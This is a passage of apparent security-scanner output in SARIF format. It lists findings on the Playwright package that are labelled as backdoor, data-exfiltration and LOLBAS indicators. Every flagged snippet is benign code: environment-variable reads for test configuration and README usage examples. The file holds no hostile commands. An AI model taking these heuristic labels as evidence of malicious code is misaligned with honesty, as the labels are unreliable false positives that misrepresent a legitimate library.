                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 19,
                  "endLine": 643,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  return {\n    wsEndpoint,\n    headers,\n    exposeNetwork: process.env.PW_TEST_CONNECT_EXPOSE_NETWORK\n  };\n}\nclass ArtifactsRecorder {\n",
                    "rendered": {
                      "text": "  return {\n    wsEndpoint,\n    headers,\n    exposeNetwork: process.env.PW_TEST_CONNECT_EXPOSE_NETWORK\n  };\n}\nclass ArtifactsRecorder {\n",
                      "markdown": "`  return {\n    wsEndpoint,\n    headers,\n    exposeNetwork: process.env.PW_TEST_CONNECT_EXPOSE_NETWORK\n  };\n}\nclass ArtifactsRecorder {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 639,
                  "startColumn": 67,
                  "endLine": 639,
                  "endColumn": 78,
                  "snippet": {
                    "text": "function connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n    wsEndpoint,\n    headers,\n",
                    "rendered": {
                      "text": "function connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n    wsEndpoint,\n    headers,\n",
                      "markdown": "`function connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n    wsEndpoint,\n    headers,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 639,
                  "startColumn": 18,
                  "endLine": 639,
                  "endColumn": 29,
                  "snippet": {
                    "text": "function connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n    wsEndpoint,\n    headers,\n",
                    "rendered": {
                      "text": "function connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n    wsEndpoint,\n    headers,\n",
                      "markdown": "`function connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n    wsEndpoint,\n    headers,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 637,
                  "startColumn": 21,
                  "endLine": 637,
                  "endColumn": 32,
                  "snippet": {
                    "text": "const kTracingStarted = Symbol('kTracingStarted');\nconst kIsReusedContext = Symbol('kReusedContext');\nfunction connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n",
                    "rendered": {
                      "text": "const kTracingStarted = Symbol('kTracingStarted');\nconst kIsReusedContext = Symbol('kReusedContext');\nfunction connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n",
                      "markdown": "`const kTracingStarted = Symbol('kTracingStarted');\nconst kIsReusedContext = Symbol('kReusedContext');\nfunction connectOptionsFromEnv() {\n  const wsEndpoint = process.env.PW_TEST_CONNECT_WS_ENDPOINT;\n  if (!wsEndpoint) return undefined;\n  const headers = process.env.PW_TEST_CONNECT_HEADERS ? JSON.parse(process.env.PW_TEST_CONNECT_HEADERS) : undefined;\n  return {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 552,
                  "startColumn": 8,
                  "endLine": 552,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    _optionContextReuseMode\n  }, use) => {\n    let mode = _optionContextReuseMode;\n    if (process.env.PW_TEST_REUSE_CONTEXT) mode = 'when-possible';\n    const reuse = mode === 'when-possible' && normalizeVideoMode(video) === 'off';\n    await use(reuse);\n  }, {\n",
                    "rendered": {
                      "text": "    _optionContextReuseMode\n  }, use) => {\n    let mode = _optionContextReuseMode;\n    if (process.env.PW_TEST_REUSE_CONTEXT) mode = 'when-possible';\n    const reuse = mode === 'when-possible' && normalizeVideoMode(video) === 'off';\n    await use(reuse);\n  }, {\n",
                      "markdown": "`    _optionContextReuseMode\n  }, use) => {\n    let mode = _optionContextReuseMode;\n    if (process.env.PW_TEST_REUSE_CONTEXT) mode = 'when-possible';\n    const reuse = mode === 'when-possible' && normalizeVideoMode(video) === 'off';\n    await use(reuse);\n  }, {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 320,
                  "startColumn": 14,
                  "endLine": 320,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    option: true\n  }],\n  baseURL: [async ({}, use) => {\n    await use(process.env.PLAYWRIGHT_TEST_BASE_URL);\n  }, {\n    option: true\n  }],\n",
                    "rendered": {
                      "text": "    option: true\n  }],\n  baseURL: [async ({}, use) => {\n    await use(process.env.PLAYWRIGHT_TEST_BASE_URL);\n  }, {\n    option: true\n  }],\n",
                      "markdown": "`    option: true\n  }],\n  baseURL: [async ({}, use) => {\n    await use(process.env.PLAYWRIGHT_TEST_BASE_URL);\n  }, {\n    option: true\n  }],\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/index.js"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 32,
                  "endLine": 110,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  connectOptions: [async ({\n    _optionConnectOptions\n  }, use) => {\n    await use(connectOptionsFromEnv() || _optionConnectOptions);\n  }, {\n    scope: 'worker',\n    option: true\n",
                    "rendered": {
                      "text": "  connectOptions: [async ({\n    _optionConnectOptions\n  }, use) => {\n    await use(connectOptionsFromEnv() || _optionConnectOptions);\n  }, {\n    scope: 'worker',\n    option: true\n",
                      "markdown": "`  connectOptions: [async ({\n    _optionConnectOptions\n  }, use) => {\n    await use(connectOptionsFromEnv() || _optionConnectOptions);\n  }, {\n    scope: 'worker',\n    option: true\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/README.md"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 47,
                  "endLine": 107,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\n#### Mobile and geolocation\n\nThis snippet emulates Mobile Safari on a device at given geolocation, navigates to maps.google.com, performs the action and takes a screenshot.\n\n```TypeScript\nimport { test, devices } from '@playwright/test';\n",
                    "rendered": {
                      "text": "\n#### Mobile and geolocation\n\nThis snippet emulates Mobile Safari on a device at given geolocation, navigates to maps.google.com, performs the action and takes a screenshot.\n\n```TypeScript\nimport { test, devices } from '@playwright/test';\n",
                      "markdown": "`\n#### Mobile and geolocation\n\nThis snippet emulates Mobile Safari on a device at given geolocation, navigates to maps.google.com, performs the action and takes a screenshot.\n\n```TypeScript\nimport { test, devices } from '@playwright/test';\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/README.md"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 172,
                  "endLine": 46,
                  "endColumn": 176,
                  "snippet": {
                    "text": "npx playwright install\n```\n\nYou can optionally install only selected browsers, see [install browsers](https://playwright.dev/docs/cli#install-browsers) for more details. Or you can install no browsers at all and use existing [browser channels](https://playwright.dev/docs/browsers).\n\n* [Getting started](https://playwright.dev/docs/intro)\n* [Installation configuration](https://playwright.dev/docs/installation)\n",
                    "rendered": {
                      "text": "npx playwright install\n```\n\nYou can optionally install only selected browsers, see [install browsers](https://playwright.dev/docs/cli#install-browsers) for more details. Or you can install no browsers at all and use existing [browser channels](https://playwright.dev/docs/browsers).\n\n* [Getting started](https://playwright.dev/docs/intro)\n* [Installation configuration](https://playwright.dev/docs/installation)\n",
                      "markdown": "`npx playwright install\n```\n\nYou can optionally install only selected browsers, see [install browsers](https://playwright.dev/docs/cli#install-browsers) for more details. Or you can install no browsers at all and use existing [browser channels](https://playwright.dev/docs/browsers).\n\n* [Getting started](https://playwright.dev/docs/intro)\n* [Installation configuration](https://playwright.dev/docs/installation)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/README.md"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 58,
                  "endLine": 129,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n#### Evaluate in browser context\n\nThis code snippet navigates to example.com, and executes a script in the page context.\n\n```TypeScript\nimport { test } from '@playwright/test';\n",
                    "rendered": {
                      "text": "\n#### Evaluate in browser context\n\nThis code snippet navigates to example.com, and executes a script in the page context.\n\n```TypeScript\nimport { test } from '@playwright/test';\n",
                      "markdown": "`\n#### Evaluate in browser context\n\nThis code snippet navigates to example.com, and executes a script in the page context.\n\n```TypeScript\nimport { test } from '@playwright/test';\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/README.md"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 21,
                  "endLine": 157,
                  "endColumn": 30,
                  "snippet": {
                    "text": "test('Intercept network requests', async ({ page }) => {\n  // Log and continue all network requests\n  await page.route('**', route => {\n    console.log(route.request().url());\n    route.continue();\n  });\n  await page.goto('http://todomvc.com');\n",
                    "rendered": {
                      "text": "test('Intercept network requests', async ({ page }) => {\n  // Log and continue all network requests\n  await page.route('**', route => {\n    console.log(route.request().url());\n    route.continue();\n  });\n  await page.goto('http://todomvc.com');\n",
                      "markdown": "`test('Intercept network requests', async ({ page }) => {\n  // Log and continue all network requests\n  await page.route('**', route => {\n    console.log(route.request().url());\n    route.continue();\n  });\n  await page.goto('http://todomvc.com');\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}